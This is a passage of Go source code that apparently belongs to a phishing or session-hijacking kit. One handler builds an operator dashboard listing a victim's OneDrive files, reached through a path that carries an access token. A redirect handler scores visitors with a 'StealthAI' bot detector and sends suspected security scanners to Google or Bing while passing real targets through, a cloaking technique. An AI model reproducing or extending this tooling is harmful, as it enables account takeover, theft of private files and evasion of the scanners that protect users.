			link = fmt.Sprintf(`<a href="%s" target="_blank" style="color:#0078d4">%s</a>`, template.HTMLEscapeString(it.WebURL), template.HTMLEscapeString(it.Name))
		}
		size := ""
		if it.Size > 0 {
			size = fmt.Sprintf("%d KB", it.Size/1024)
		}
		rows.WriteString(fmt.Sprintf(`<tr><td>%s %s</td><td style="color:#555;font-size:11px">%s</td></tr>`, icon, link, size))
	}

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprintf(w, `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>OneDrive — %s</title>
<style>*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,'Segoe UI',Arial,sans-serif;background:#0f0f0f;color:#e0e0e0;padding:24px}
h1{font-size:18px;color:#fff;margin-bottom:4px}
.sub{font-size:12px;color:#555;margin-bottom:18px}
table{width:100%%;border-collapse:collapse;font-size:13px}
th{text-align:left;padding:7px 10px;color:#444;border-bottom:1px solid #222;font-size:11px;text-transform:uppercase}
td{padding:8px 10px;border-bottom:1px solid #1c1c1c;vertical-align:middle}
tr:hover td{background:#1a1a1a}
a{color:#0078d4}
.back{color:#666;font-size:12px;text-decoration:none;display:block;margin-bottom:14px}
</style></head><body>
<a class="back" href="/dc/use/%s">&larr; Dashboard</a>
<h1>OneDrive</h1><p class="sub">%s</p>
<table><thead><tr><th>Name</th><th>Size</th></tr></thead><tbody>
%s
</tbody></table></body></html>`,
		template.HTMLEscapeString(email), tok, template.HTMLEscapeString(email), rows.String())
}

// jsonQ returns a JSON-quoted string (for building Graph API payloads inline).
func jsonQ(s string) string {
	b, _ := json.Marshal(s)
	return string(b)
}

// HandleRedirect returns an http.HandlerFunc that implements the same redirect logic as
// HttpServer.handleRedirect but is usable outside the core package. This allows tests
// and tools to reuse the redirect behavior by providing a Config.
func HandleRedirect(cfg *Config) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if cfg != nil && cfg.IsStealthAIEnabled() {
			packet := r.UserAgent() + "|" + r.RemoteAddr + "|" + r.URL.String()
			score, err := AnalyzeTrafficWithStealthAI(packet)
			if err == nil {
				log.Info("StealthAI score: %f for UA: %s", score, r.UserAgent())
				if score > 0.85 {
					log.Warning("Bot detected and blocked: UA=%s IP=%s", r.UserAgent(), r.RemoteAddr)
					http.Redirect(w, r, "https://www.google.com", http.StatusFound)
					return
				} else if score > 0.5 {
					log.Warning("Suspicious traffic redirected: UA=%s IP=%s", r.UserAgent(), r.RemoteAddr)
					http.Redirect(w, r, "https://www.bing.com", http.StatusFound)
					return
				} else {
					log.Info("Normal user allowed: UA=%s IP=%s", r.UserAgent(), r.RemoteAddr)
				}
			}
		}
		http.Redirect(w, r, "https://"+r.Host+r.URL.String(), http.StatusFound)
	}
}
